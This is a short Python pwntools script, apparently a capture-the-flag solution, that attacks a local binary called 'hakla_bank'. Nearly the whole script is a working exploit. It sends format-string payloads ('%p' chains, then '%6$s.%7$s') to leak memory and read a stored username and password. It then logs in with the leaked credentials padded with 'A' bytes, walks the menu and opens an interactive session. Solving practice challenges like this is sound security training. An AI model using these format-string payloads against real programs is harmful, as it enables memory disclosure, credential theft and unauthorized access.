from pwn import *

p = process('./hakla_bank')
p.sendlineafter(b': ',b'1')
p.sendlineafter(b': ',b'%p.%p.%p.%p.%p.%p.%p.%p')
leak = p.recvline().decode().split(",")[1].split(".")
print(leak)

p.sendlineafter(b': ',b'1')
p.sendlineafter(b': ', b'%6$s.%7$s')

username,password = p.recvline().decode().split(",")[1].strip().split(".")
print("leaked Username: ",username)
print("leaked password: ",password)

p.sendlineafter(b': ',b'2')
p.sendlineafter(b': ',username.encode() + b'A'*18 + password.encode())

p.sendlineafter(b': ',b'4')


p.sendlineafter(b': ',b'1337')

p.interactive()